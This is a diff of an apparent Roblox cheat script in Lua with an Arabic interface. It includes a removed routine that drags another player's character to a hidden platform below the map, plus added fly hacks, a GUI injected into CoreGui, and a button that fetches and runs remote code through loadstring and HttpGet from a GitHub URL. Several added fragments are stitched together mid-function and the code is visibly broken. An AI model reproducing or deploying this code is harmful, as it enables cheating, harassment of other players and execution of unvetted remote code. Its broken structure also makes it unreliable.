-        while true do
-            local v112
-            v111, v112 = v109(v110, v111)
-            if v111 == nil then
-                break
-            end
-            if v112:IsA("Tool") and v112.Name == "Couch" then
-                v112.Parent = game.Players.LocalPlayer.Character
-                return v112
-            end
-        end
-        local v113, v114, v115 = ipairs(game.Players.LocalPlayer.Character:GetChildren())
-        while true do
-            local v116
-            v115, v116 = v113(v114, v115)
-            if v115 == nil then
-                break
-            end
-            if v116:IsA("Tool") and v116.Name == "Couch" then
-                return v116
-            end
-        end
-        return nil
-    end
-    function BrookBring(p117, p118)
-        local v119 = game.Players[p117]
-        local v120
-        if game.workspace:FindFirstChild("Platform") then
-            v120 = game.workspace:FindFirstChild("Platform")
-        else
-            v120 = Instance.new("Part", workspace)
-            v120.Name = "Platform"
-            v120.Anchored = true
-            v120.Size = Vector3.new(200, 1, 200)
-            v120.CFrame = CFrame.new(0, - 500, 0)
-            v120.CanCollide = true
-            v120.Transparency = 1
-        end
-        local v121 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-        local v122 = 0
-        local v123 = 0
-        while true do
-            task.wait()
-            v122 = v122 + 1
-            local v124 = GetSofa()
-            if not v124 then
-                SendNotify("System TRX " , "\239\191\189\216\173\216\170\216\167\216\172 \217\131\217\134\216\168\216\169 \216\173\216\170\216\167 \216\170\217\130\216\175\216\177 \216\170\216\179\216\173\216\168", 5)
-                break
-            end
-            local v125 = nil
-            if v124.Seat1.Occupant ~= nil then
-                if v124.Seat1.Occupant and v124.Seat1.Occupant == v119.Character.Humanoid then
-                    v125 = v124.Seat1
-                elseif v124.Seat1.Occupant and v124.Seat1.Occupant ~= v119.Character.Humanoid then
-                    if v124.Seat2.Occupant ~= nil then
-                        if v124.Seat2.Occupant and v124.Seat2.Occupant == v119.Character.Humanoid then
-                            v125 = v124.Seat2
-                        end
-                    else
-                        v125 = v124.Seat2
-                    end
+end)
+
+toggles.Materials.button.MouseButton1Click:Connect(function()
+    SetToggle("Materials", not toggles.Materials.state)
+    for _, part in pairs(workspace:GetDescendants()) do
+        if part:IsA("BasePart") then
+            if toggles.Materials.state then
+                if not part:FindFirstChild("OriginalMaterial") then
+                    local original = Instance.new("StringValue", part)
+                    original.Name = "OriginalMaterial"
+                    original.Value = part.Material.Name
                 end
+                part.Material = Enum.Material.SmoothPlastic
             else
-                v125 = v124.Seat1
-            end
-            if v119.Character.Humanoid.Sit and v119.Character.Humanoid.SeatPart == v125 then
-                if p118 then
-                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v121
-                    game.Players.LocalPlayer.Character.Humanoid:ChangeState("GettingUp")
-                else
-                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v120.CFrame * CFrame.new(0, 5, 0)
+                if part:FindFirstChild("OriginalMaterial") then
+                    part.Material = Enum.Material[part.OriginalMaterial.Value]
+                    part.OriginalMaterial:Destroy()
                 end
-                wait(1)
-                v124.Parent = game.Players.LocalPlayer.Backpack
-                break
-            end
-            if v119.Character.Humanoid.Sit and v119.Character.Humanoid.SeatPart ~= v125 then
-                SendNotify("System TRX ", "\239\191\189\216\167\217\138\217\133\217\131\217\134 \216\179\216\173\216\168 \216\167\217\132\216\182\216\173\217\138\216\169 \217\132\216\167\217\134\217\135 \217\130\216\167\216\185\216\175", 5)
-                break
-            end
-            if v124.Parent ~= game.Players.LocalPlayer.Character then
-                v124.Parent = game.Players.LocalPlayer.Character
-            end
-            local v126 = math.sin(v123) * 4
-            v123 = v123 + 0.2
-            local v127 = v119.Character.HumanoidRootPart.Position + Vector3.new(0, - 4.5 + v126, 0) + v119.Character.HumanoidRootPart.CFrame.lookVector * - 0.7 + v119.Character.HumanoidRootPart.Velocity * Vector3.new(0.2, 0, 0.2)
-            local v128 = (v119.Character.HumanoidRootPart.CFrame.lookVector * Vector3.new(1, 0, 1)).Unit
-            v125.CFrame = CFrame.new(v127, v127 - v128)
-            if v122 >= 200 then
-                break
             end
         end
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v121
-        game.Players.LocalPlayer.Character.Humanoid:ChangeState("GettingUp")
     end
-    function ChangeToggleColor(p129)
-        led = p129.Ticket_Asset
-        if led.ImageColor3 ~= Color3.fromRGB(255, 0, 0) then
-            led.ImageColor3 = Color3.fromRGB(255, 0, 0)
+end)
+
+toggles.Water.button.MouseButton1Click:Connect(function()
+    SetToggle("Water", not toggles.Water.state)
+    if toggles.Water.state then
+        workspace.Terrain.WaterWaveSize = 0
+        workspace.Terrain.WaterWaveSpeed = 0
+        workspace.Terrain.WaterReflectance = 0
+        workspace.Terrain.WaterTransparency = 0.5
+    else
+        workspace.Terrain.WaterWaveSize = originalProperties.WaterWaveSize
+        workspace.Terrain.WaterWaveSpeed = originalProperties.WaterWaveSpeed
+        workspace.Terrain.WaterReflectance = originalProperties.WaterReflectance
+        workspace.Terrain.WaterTransparency = originalProperties.WaterTransparency
+    end
+end)
+
+toggles.Lighting.button.MouseButton1Click:Connect(function()
+    SetToggle("Lighting", not toggles.Lighting.state)
+    Lighting.Technology = toggles.Lighting.state and Enum.Technology.Compatibility or originalProperties.Technology
+end)
+
+toggles.Textures.button.MouseButton1Click:Connect(function()
+    SetToggle("Textures", not toggles.Textures.state)
+    for _, v in pairs(workspace:GetDescendants()) do
+        if v:IsA("Texture") or v:IsA("Decal") then
+            v.Transparency = toggles.Textures.state and 1 or 0
+        end
+    end
+end)
+
+RevertButton.MouseButton1Click:Connect(RevertAll)
+
+
+local dragging, dragStart, startPos
+TitleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+        local conn
+        conn = input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+                conn:Disconnect()
+            end
+        end)
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end);
+        wait(1)
+        toggleButton(script.Parent, false)
+	
+            Notify("سكربتات الدارك ", "تم اصلاح اللاق", 3)
+        end
+    })
+
+    FaresTab:AddButton({
+        Name="طياران السيارات",
+        Callback=function()
+            local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local Player = Players.LocalPlayer
+
+
+local Gui = Instance.new("ScreenGui", game.CoreGui)
+Gui.Name = "CarFly_FARES"
+
+local Main = Instance.new("Frame", Gui)
+Main.Size = UDim2.fromScale(0.38,0.45)
+Main.Position = UDim2.fromScale(0.31,0.25)
+Main.BackgroundColor3 = Color3.fromRGB(30,30,30)
+Main.Active = true
+Main.Draggable = true
+Instance.new("UICorner",Main).CornerRadius = UDim.new(0,15)
+
+
+local Title = Instance.new("TextLabel", Main)
+Title.Size = UDim2.fromScale(1,0.12)
+Title.BackgroundColor3 = Color3.fromRGB(50,50,50)
+Title.Text = "طيران سيارات - FARES"
+Title.TextColor3 = Color3.fromRGB(255,255,255)
+Title.TextScaled = true
+Instance.new("UICorner",Title).CornerRadius = UDim.new(0,15)
+
+
+local SpeedLabel = Instance.new("TextLabel", Main)
+SpeedLabel.Size = UDim2.fromScale(0.35,0.1)
+SpeedLabel.Position = UDim2.fromScale(0.05,0.18)
+SpeedLabel.BackgroundTransparency = 1
+SpeedLabel.Text = "Speed Number:"
+SpeedLabel.TextColor3 = Color3.fromRGB(255,255,255)
+SpeedLabel.TextScaled = true
+
+local SpeedBox = Instance.new("TextBox", Main)
+SpeedBox.Size = UDim2.fromScale(0.5,0.1)
+SpeedBox.Position = UDim2.fromScale(0.45,0.18)
+SpeedBox.Text = "20"
+SpeedBox.PlaceholderText = "السرعة"
+SpeedBox.BackgroundColor3 = Color3.fromRGB(40,40,40)
+SpeedBox.TextColor3 = Color3.fromRGB(0,255,170)
+SpeedBox.TextScaled = true
+Instance.new("UICorner",SpeedBox).CornerRadius = UDim.new(0,10)
+
+
+local Toggle = Instance.new("TextButton", Main)
+Toggle.Size = UDim2.fromScale(0.9,0.12)
+Toggle.Position = UDim2.fromScale(0.05,0.32)
+Toggle.Text = "تشغيل الطيران"
+Toggle.BackgroundColor3 = Color3.fromRGB(0,170,120)
+Toggle.TextColor3 = Color3.fromRGB(255,255,255)
+Toggle.TextScaled = true
+Instance.new("UICorner",Toggle).CornerRadius = UDim.new(0,10)
+
+
+local ButtonsInfo = {
+    {name="أمام", dir="Forward"},
+    {name="ورا", dir="Backward"},
+    {name="يمين", dir="Right"},
+    {name="شمال", dir="Left"},
+    {name="فوق", dir="Up"},
+    {name="تحت", dir="Down"}
+}
+
+local btns = {}
+local activeBtns = {} -- track pressed buttons
+
+for i, info in ipairs(ButtonsInfo) do
+    local btn = Instance.new("TextButton", Main)
+    btn.Size = UDim2.fromScale(0.42,0.12)
+    btn.Position = UDim2.fromScale(0.05 + ((i-1)%2)*0.48, 0.46 + math.floor((i-1)/2)*0.14)
+    btn.Text = info.name
+    btn.BackgroundColor3 = Color3.fromRGB(60,60,60)
+    btn.TextColor3 = Color3.fromRGB(255,255,255)
+    btn.TextScaled = true
+    Instance.new("UICorner",btn).CornerRadius = UDim.new(0,10)
+    btns[info.dir] = btn
+
+    
+    btn.MouseButton1Down:Connect(function()
+        activeBtns[info.dir] = true
+    end)
+    btn.MouseButton1Up:Connect(function()
+        activeBtns[info.dir] = false
+    end)
+end
+
+-- Fly Logic
+local flying = false
+local BV,BG
+
+Toggle.MouseButton1Click:Connect(function()
+    local char = Player.Character
+    if not char then return end
+    local hrp = char:WaitForChild("HumanoidRootPart")
+    flying = not flying
+
+    if flying then
+        Toggle.Text = "ايقاف الطيران"
+        Toggle.BackgroundColor3 = Color3.fromRGB(200,60,60)
+    else
+        Toggle.Text = "تشغيل الطيران"
+        Toggle.BackgroundColor3 = Color3.fromRGB(0,170,120)
+        if BV then BV:Destroy() end
+        if BG then BG:Destroy() end
+        return
+    end
+
+    BV = Instance.new("BodyVelocity",hrp)
+    BV.MaxForce = Vector3.new(1e9,1e9,1e9)
+
+    BG = Instance.new("BodyGyro",hrp)
+    BG.MaxTorque = Vector3.new(1e9,1e9,1e9)
+
+    RunService.RenderStepped:Connect(function()
+        if flying then
+            BG.CFrame = workspace.CurrentCamera.CFrame
+            local cam = workspace.CurrentCamera.CFrame
+            local dir = Vector3.zero
+
+            if activeBtns.Forward then dir = dir + cam.LookVector end
+            if activeBtns.Backward then dir = dir - cam.LookVector end
+            if activeBtns.Right then dir = dir + cam.RightVector end
+            if activeBtns.Left then dir = dir - cam.RightVector end
+            if activeBtns.Up then dir = dir + Vector3.new(0,1,0) end
+            if activeBtns.Down then dir = dir - Vector3.new(0,1,0) end
+
+            BV.Velocity = dir.Unit * tonumber(SpeedBox.Text) if dir.Magnitude == 0 then BV.Velocity = Vector3.zero end
+        end
+    end)
+end)
+            Notify("سكربتات مع تعاون الدارك وا المطورين  SA I TRX", "تم تشغيل طياران السيارات", 3)
+        end
+    })
+
+FaresTab:AddButton({
+     Name=" SA l TRX سكربت طياران من صنع الدارك مع تعاون الطمورين FLY", 
+     Callback=function()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/ook314745-svg/fly/refs/heads/main/fly"))()
+     
+     Notify("سكربتات الدارك مع تعاون المطورين SA l TRX ", "تم تشغيل طياران FLY", 3)
+        end
+    })
+
+
+    FaresTab:AddButton({
+        Name="TRX l SA شادر من صنع مع تعاون الدارك وا المطورين",
+        Callback=function()
+            
+
+
+local Lighting = game:GetService("Lighting")  
+local Workspace = game:GetService("Workspace")  
+local RunService = game:GetService("RunService")  
+local Players = game:GetService("Players")  
+local TweenService = game:GetService("TweenService")  
+local UserInputService = game:GetService("UserInputService")  
+
+local Player = Players.LocalPlayer  
+local PlayerGui = Player:WaitForChild("PlayerGui")  
+local Camera = Workspace.CurrentCamera  
+
+local originalSettings = {}  
+local effects = {}  
+local shaderEnabled = false  
+local foliageConnection = nil  
+local motionBlurConnection = nil  
+
+-- Deep copy function
+local function deepcopy(orig)  
+    if type(orig) ~= 'table' then return orig end  
+    local copy = {}  
+    for k, v in pairs(orig) do copy[deepcopy(k)] = deepcopy(v) end  
+    setmetatable(copy, deepcopy(getmetatable(orig)))  
+    return copy  
+end  
+
+
+  
+local Presets = {
+    Dynamic = { Name="Dynamic", Technology="Future", Brightness=2.2, ShadowSoftness=0.15, 
+        Bloom={Enabled=true, Intensity=0.3, Size=60, Threshold=0.7},
+        ColorCorrection={Enabled=true, Brightness=0.05, Contrast=0.1, Saturation=0.25, TintColor=Color3.fromRGB(255,255,255)},
+        SunRays={Enabled=true, Intensity=0.1, Spread=0.25},
+        Atmosphere={Enabled=true, Density=0.35, Offset=0.1, Haze=1.2, Decay=Color3.fromRGB(150,170,200)},
+        DepthOfField={Enabled=false, FarIntensity=0.1, FocusDistance=0, InFocusRadius=20},
+        ChromaticAberration={Enabled=false},
+        Water={Color=Color3.fromRGB(100,175,220), Transparency=0.6, WaveSize=0.1, WaveSpeed=0.05}
+    },
+    Ultra = { Name="ULTRA", Technology="Future", Brightness=3, ShadowSoftness=0.05,
+        Bloom={Enabled=true, Intensity=0.6, Size=80, Threshold=0.5},
+        ColorCorrection={Enabled=true, Brightness=0.1, Contrast=0.2, Saturation=0.3, TintColor=Color3.fromRGB(255,230,200)},
+        SunRays={Enabled=true, Intensity=0.3, Spread=0.3},
+        Atmosphere={Enabled=true, Density=0.4, Offset=0.2, Haze=1.5, Decay=Color3.fromRGB(180,190,210)},
+        DepthOfField={Enabled=true, FarIntensity=0.1, FocusDistance=0, InFocusRadius=20},
+        ChromaticAberration={Enabled=true},
+        Water={Color=Color3.fromRGB(40,80,120), Transparency=0.4, WaveSize=0.05, WaveSpeed=0.02}
+    },
+    Vibrant = { Name="QUALITY", Technology="Future", Brightness=2.5, ShadowSoftness=0.2,
+        Bloom={Enabled=true, Intensity=0.5, Size=70, Threshold=0.6},
+        ColorCorrection={Enabled=true, Brightness=0.15, Contrast=0.25, Saturation=0.6, TintColor=Color3.fromRGB(255,250,240)},
+        SunRays={Enabled=true, Intensity=0.2, Spread=0.4},
+        Atmosphere={Enabled=true, Density=0.2, Offset=0, Haze=1, Decay=Color3.fromRGB(200,180,160)},
+        DepthOfField={Enabled=false, FarIntensity=0.1, FocusDistance=0, InFocusRadius=20},
+        ChromaticAberration={Enabled=false},
+        Water={Color=Color3.fromRGB(80,200,255), Transparency=0.5, WaveSize=0.15, WaveSpeed=0.1}
+    },
+    Night = { Name="Night Mode", Technology="Future", Brightness=1.5, ShadowSoftness=0.3,
+        Bloom={Enabled=true, Intensity=0.4, Size=100, Threshold=0.8},
+        ColorCorrection={Enabled=true, Brightness=-0.1, Contrast=0.05, Saturation=0.15, TintColor=Color3.fromRGB(200,220,255)},
+        SunRays={Enabled=false, Intensity=0.05, Spread=0.5},
+        Atmosphere={Enabled=true, Density=0.6, Offset=0.5, Haze=2, Decay=Color3.fromRGB(50,60,80)},
+        DepthOfField={Enabled=false, FarIntensity=0.1, FocusDistance=0, InFocusRadius=20},
+        ChromaticAberration={Enabled=false},
+        Water={Color=Color3.fromRGB(30,50,80), Transparency=0.3, WaveSize=0.1, WaveSpeed=0.05}
+    }
+}
+local currentSettings = deepcopy(Presets.Dynamic)
+
+  
+local function backupOriginals()
+    originalSettings = {Lighting={}, Terrain={}, Effects={}}
+    local lightingProps = {"Ambient","Brightness","ColorShift_Top","EnvironmentDiffuseScale","EnvironmentSpecularScale","GlobalShadows","OutdoorAmbient","ShadowSoftness","Technology"}
+    for _,prop in ipairs(lightingProps) do originalSettings.Lighting[prop] = Lighting[prop] end
+    local terrainProps = {"WaterColor","WaterTransparency","WaterWaveSize","WaterWaveSpeed"}
+    for _,prop in ipairs(terrainProps) do originalSettings.Terrain[prop] = Workspace.Terrain[prop] end
+    for _,child in ipairs(Lighting:GetChildren()) do
+        if child:IsA("PostEffect") then originalSettings.Effects[child.Name] = child:Clone() end
+    end
+end
+
+local function restoreOriginals()
+    if not next(originalSettings) then return end
+    for prop,value in pairs(originalSettings.Lighting) do Lighting[prop] = value end
+    for prop,value in pairs(originalSettings.Terrain) do Workspace.Terrain[prop] = value end
+    for _,child in ipairs(Lighting:GetChildren()) do
+        if child:IsA("PostEffect") and not originalSettings.Effects[child.Name] then child:Destroy() end
+    end
+    for name,effect in pairs(originalSettings.Effects) do
+        local existing = Lighting:FindFirstChild(name)
+        if existing then existing:Destroy() end
+        effect:Clone().Parent = Lighting
+    end
+end
+
+  
+local function getOrCreateEffect(name,class)
+    if effects[name] and effects[name].Parent then return effects[name] end
+    local effect = Lighting:FindFirstChild(name) or Instance.new(class)
+    effect.Name = name
+    effect.Parent = Lighting
+    effects[name] = effect
+    return effect
+end
+
+local function applyAllSettings()
+    if not shaderEnabled then return end
+    Lighting.Technology = Enum.Technology[currentSettings.Technology]
+    Lighting.Brightness = currentSettings.Brightness
+    Lighting.ShadowSoftness = currentSettings.ShadowSoftness
+    Workspace.Terrain.WaterColor = currentSettings.Water.Color
+    Workspace.Terrain.WaterTransparency = currentSettings.Water.Transparency
+    Workspace.Terrain.WaterWaveSize = currentSettings.Water.WaveSize
+    Workspace.Terrain.WaterWaveSpeed = currentSettings.Water.WaveSpeed
+
+    local effectMap = {Bloom="BloomEffect",ColorCorrection="ColorCorrectionEffect",SunRays="SunRaysEffect",Atmosphere="Atmosphere",DepthOfField="DepthOfFieldEffect"}
+    for effectName,effectSettings in pairs(currentSettings) do
+        local class = effectMap[effectName]
+        if class and type(effectSettings)=="table" and effectSettings.Enabled~=nil then
+            local effect = getOrCreateEffect(effectName,class)
+            for prop,value in pairs(effectSettings) do if prop~="Enabled" then effect[prop]=value end end
+            effect.Enabled = effectSettings.Enabled
+        end
+    end
+
+    
+    local cc = getOrCreateEffect("ColorCorrection","ColorCorrectionEffect")
+    if currentSettings.ChromaticAberration.Enabled then
+        cc.TintColor = Color3.new(1.05,1,1)
+    else
+        cc.TintColor = currentSettings.ColorCorrection.TintColor
+    end
+end
+
+  
+local function startAnimations()
+    if foliageConnection then foliageConnection:Disconnect() end
+    foliageConnection = RunService.RenderStepped:Connect(function()
+        local t=tick()
+        local x = math.sin(t*0.5)*0.02
+        local z = math.cos(t*0.5)*0.02
+        local grass = Workspace.Terrain:FindFirstChild("Model") and Workspace.Terrain.Model:FindFirstChild("Grass")
+        if grass then grass.CFrame = CFrame.new() + Vector3.new(x,0,z) end
+    end)
+
+    if motionBlurConnection then motionBlurConnection:Disconnect() end
+    local blur = getOrCreateEffect("MotionBlur","BlurEffect")
+    blur.Enabled = true
+    blur.Size = 0
+    local lastCFrame = Camera.CFrame
+    motionBlurConnection = RunService.RenderStepped:Connect(function()
+        local _,angle=(lastCFrame:ToObjectSpace(Camera.CFrame)):ToAxisAngle()
+        blur.Size = math.min(24, angle*20)
+        lastCFrame=Camera.CFrame
+    end)
+end
+
+local function stopAnimations()
+    if foliageConnection then foliageConnection:Disconnect(); foliageConnection=nil end
+    if motionBlurConnection then motionBlurConnection:Disconnect(); motionBlurConnection=nil end
+    if effects.MotionBlur then effects.MotionBlur:Destroy(); effects.MotionBlur=nil end
+    local grass = Workspace.Terrain:FindFirstChild("Model") and Workspace.Terrain.Model:FindFirstChild("Grass")
+    if grass then grass.CFrame = CFrame.new() end
+end
+
+  
+local function enableShader()
+    if shaderEnabled then return end
+    backupOriginals()
+    shaderEnabled=true
+    applyAllSettings()
+    startAnimations()
+end
+
+local function disableShader()
+    if not shaderEnabled then return end
+    shaderEnabled=false
+    stopAnimations()
+    restoreOriginals()
+    effects={}
+end
+
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name="FaresOmniShaderGUI"
+screenGui.ResetOnSpawn=false
+screenGui.ZIndexBehavior=Enum.ZIndexBehavior.Global
+screenGui.Parent=PlayerGui
+
+local mainFrame=Instance.new("Frame")
+mainFrame.Name="MainFrame"
+mainFrame.Parent=screenGui
+mainFrame.BackgroundColor3=Color3.fromRGB(25,25,25)
+mainFrame.BorderColor3=Color3.fromRGB(218,165,32)
+mainFrame.BorderSizePixel=2
+mainFrame.Position=UDim2.new(0.03,0,0.1,0)
+mainFrame.Size=UDim2.new(0.7,0,0.7,0)
+mainFrame.Active=true
+mainFrame.Draggable=true
+local corner=Instance.new("UICorner"); corner.CornerRadius=UDim.new(0,8); corner.Parent=mainFrame
+
+local header=Instance.new("Frame")
+header.Name="Header"
+header.Parent=mainFrame
+header.BackgroundColor3=Color3.fromRGB(35,35,35)
+header.Size=UDim2.new(1,0,0,50)
+local headerCorner=Instance.new("UICorner"); headerCorner.CornerRadius=UDim.new(0,8); headerCorner.Parent=header
+
+local titleLabel=Instance.new("TextLabel")
+titleLabel.Name="Title"
+titleLabel.Parent=header
+titleLabel.BackgroundTransparency=1
+titleLabel.Position=UDim2.new(0,10,0,0)
+titleLabel.Size=UDim2.new(1,-20,0,30)
+titleLabel.Font=Enum.Font.GothamBold
+titleLabel.Text="FARES SCRIPT-SHADERv1"
+titleLabel.TextColor3=Color3.fromRGB(218,165,32)
+titleLabel.TextSize=18
+titleLabel.TextXAlignment=Enum.TextXAlignment.Left
+
+local mainToggle=Instance.new("TextButton")
+mainToggle.Name="MainToggle"
+mainToggle.Parent=header
+mainToggle.BackgroundColor3=Color3.fromRGB(200,40,40)
+mainToggle.Position=UDim2.new(1,-60,0.5,-12)
+mainToggle.Size=UDim2.new(0,50,0,24)
+mainToggle.Font=Enum.Font.GothamBold
+mainToggle.Text="شغل"
+mainToggle.TextColor3=Color3.fromRGB(255,255,255)
+mainToggle.TextSize=14
+local toggleCorner=Instance.new("UICorner"); toggleCorner.CornerRadius=UDim.new(0,6); toggleCorner.Parent=mainToggle
+
+mainToggle.MouseButton1Click:Connect(function()
+    if shaderEnabled then disableShader() mainToggle.Text="شغل" mainToggle.BackgroundColor3=Color3.fromRGB(200,40,40)
+    else enableShader() mainToggle.Text="ON" mainToggle.BackgroundColor3=Color3.fromRGB(40,200,40) end
+end)
+
+
+local contentFrame=Instance.new("Frame")
+contentFrame.Name="ContentFrame"
+contentFrame.Parent=mainFrame
+contentFrame.BackgroundTransparency=1
+contentFrame.Position=UDim2.new(0,0,0,50)
+contentFrame.Size=UDim2.new(1,0,1,-50)
+
+
+
+local presetFrame = Instance.new("Frame")
+presetFrame.Name = "PresetFrame"
+presetFrame.Parent = contentFrame
+presetFrame.BackgroundTransparency = 1
+presetFrame.Size = UDim2.new(1, -20, 0, 40)
+presetFrame.Position = UDim2.new(0, 10, 0, 10)
+
+local presetLabel = Instance.new("TextLabel")
+presetLabel.Parent = presetFrame
+presetLabel.BackgroundTransparency = 1
+presetLabel.Size = UDim2.new(0.3,0,1,0)
+presetLabel.Position = UDim2.new(0,0,0,0)
+presetLabel.Font = Enum.Font.GothamBold
+presetLabel.Text = "لو ضغطت علي زر شغل بيشتغل! ولو ضغطت مره تانيه بيفصل! "
+presetLabel.TextColor3 = Color3.fromRGB(200,200,200)
+presetLabel.TextSize = 7.8
+presetLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+local buttonsHolder = Instance.new("Frame")
+buttonsHolder.Name = "ButtonsHolder"
+buttonsHolder.Parent = presetFrame
+buttonsHolder.BackgroundTransparency = 1
+buttonsHolder.Size = UDim2.new(0.7,0,1,0)
+buttonsHolder.Position = UDim2.new(0.3,5,0,0)
+
+local buttonLayout = Instance.new("UIListLayout")
+buttonLayout.Parent = buttonsHolder
+buttonLayout.FillDirection = Enum.FillDirection.Horizontal
+buttonLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
+buttonLayout.SortOrder = Enum.SortOrder.LayoutOrder
+buttonLayout.Padding = UDim.new(0,5)
+
+
+local function createPresetButton(presetName, layoutOrder)
+    local button = Instance.new("TextButton")
+    button.Name = presetName
+    button.LayoutOrder = layoutOrder
+    button.Parent = buttonsHolder
+    button.BackgroundColor3 = Color3.fromRGB(50,50,50)
+    button.Size = UDim2.new(0,70,1,0)
+    button.Font = Enum.Font.Gotham
+    button.Text = Presets[presetName].Name
+    button.TextColor3 = Color3.fromRGB(220,220,220)
+    button.TextSize = 14
+
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0,6)
+    btnCorner.Parent = button
+
+    button.MouseButton1Click:Connect(function()
+        currentSettings = deepcopy(Presets[presetName])
+        applyAllSettings()
+    end)
+
+    return button
+end
+
+
+createPresetButton("Dynamic",1)
+createPresetButton("Ultra",2)
+createPresetButton("Vibrant",3)
+createPresetButton("Night",4)
+
+
+  
+local settingsList=Instance.new("ScrollingFrame")
+settingsList.Name="SettingsList"
+settingsList.Parent=contentFrame
+settingsList.BackgroundColor3=Color3.fromRGB(30,30,30)
+settingsList.BorderSizePixel=0
+settingsList.Position=UDim2.new(0,0,0,50)
+settingsList.Size=UDim2.new(1,0,1,-50)
+settingsList.CanvasSize=UDim2.new(0,0,0,0)
+settingsList.ScrollBarThickness=6
+
+local listLayout=Instance.new("UIListLayout")
+listLayout.Parent=settingsList
+listLayout.SortOrder=Enum.SortOrder.LayoutOrder
+listLayout.Padding=UDim.new(0,10)
+
+local function createSlider(parent,name,min,max,initialValue,callback)
+    local frame=Instance.new("Frame")
+    frame.Name=name.."Slider"
+    frame.Parent=parent
+    frame.BackgroundTransparency=1
+    frame.Size=UDim2.new(1,-20,0,40)
+    frame.Position=UDim2.new(0,10,0,0)
+
+    local label=Instance.new("TextLabel")
+    label.Parent=frame
+    label.BackgroundTransparency=1
+    label.Size=UDim2.new(0.5,0,0,20)
+    label.Font=Enum.Font.Gotham
+    label.Text=name
+    label.TextColor3=Color3.fromRGB(200,200,200)
+    label.TextSize=14
+    label.TextXAlignment=Enum.TextXAlignment.Left
+
+    local valueLabel=Instance.new("TextLabel")
+    valueLabel.Parent=frame
+    valueLabel.BackgroundTransparency=1
+    valueLabel.Position=UDim2.new(0.5,0,0,0)
+    valueLabel.Size=UDim2.new(0.5,-10,0,20)
+    valueLabel.Font=Enum.Font.Gotham
+    valueLabel.Text=string.format("%.2f",initialValue)
+    valueLabel.TextColor3=Color3.fromRGB(200,200,200)
+    valueLabel.TextSize=14
+    valueLabel.TextXAlignment=Enum.TextXAlignment.Right
+
+    local sliderBg=Instance.new("Frame")
+    sliderBg.Parent=frame
+    sliderBg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+    sliderBg.Position = UDim2.new(0, 0, 0, 25)
+    sliderBg.Size = UDim2.new(1, 0, 0, 10)
+    local sliderCorner = Instance.new("UICorner")
+    sliderCorner.CornerRadius = UDim.new(0, 5)
+    sliderCorner.Parent = sliderBg
+
+    local handle = Instance.new("TextButton")
+    handle.Parent = sliderBg
+    handle.BackgroundColor3 = Color3.fromRGB(218, 165, 32)
+    handle.Size = UDim2.new(0, 10, 1, 0)
+    handle.Text = ""
+    local handleCorner = Instance.new("UICorner")
+    handleCorner.CornerRadius = UDim.new(0, 5)
+    handleCorner.Parent = handle
+    handle.Position = UDim2.new((initialValue - min) / (max - min), -5, 0, 0)
+
+    local dragging = false
+
+local function updateHandle(input)
+    local pos = input.Position.X - sliderBg.AbsolutePosition.X
+    local percentage = math.clamp(pos / sliderBg.AbsoluteSize.X, 0, 1)
+    local value = min + (max - min) * percentage
+    handle.Position = UDim2.new(percentage, -5, 0, 0)
+    valueLabel.Text = string.format("%.2f", value)
+    callback(value)
+end
+
+sliderBg.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        updateHandle(input)
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        updateHandle(input)
+    end
+end)
+
+    return frame
+end
+
+
+createSlider(settingsList, "Brightness", 0, 5, currentSettings.Brightness, function(val)
+    currentSettings.Brightness = val
+    applyAllSettings()
+end)
+createSlider(settingsList, "Saturation", -1, 1, currentSettings.ColorCorrection.Saturation, function(val)
+    currentSettings.ColorCorrection.Saturation = val
+    applyAllSettings()
+end)
+createSlider(settingsList, "Contrast", -1, 1, currentSettings.ColorCorrection.Contrast, function(val)
+    currentSettings.ColorCorrection.Contrast = val
+    applyAllSettings()
+end)
+createSlider(settingsList, "Bloom Intensity", 0, 2, currentSettings.Bloom.Intensity, function(val)
+    currentSettings.Bloom.Intensity = val
+    applyAllSettings()
+end)
+createSlider(settingsList, "Bloom Size", 0, 100, currentSettings.Bloom.Size, function(val)
+    currentSettings.Bloom.Size = val
+    applyAllSettings()
+end)
+createSlider(settingsList, "Sun Rays", 0, 1, currentSettings.SunRays.Intensity, function(val)
+    currentSettings.SunRays.Intensity = val
+    applyAllSettings()
+end)
+createSlider(settingsList, "Haze", 0, 5, currentSettings.Atmosphere.Haze, function(val)
+    currentSettings.Atmosphere.Haze = val
+    applyAllSettings()
+end)
+
+
+settingsList.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 10)
+
+
+Player.CharacterRemoving:Connect(function()
+    if shaderEnabled then disableShader() end
+    pcall(function() screenGui:Destroy() end)
+end)
+
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local Lighting = game:GetService("Lighting")
+
+local player = Players.LocalPlayer
+
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "TimeGUI"
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
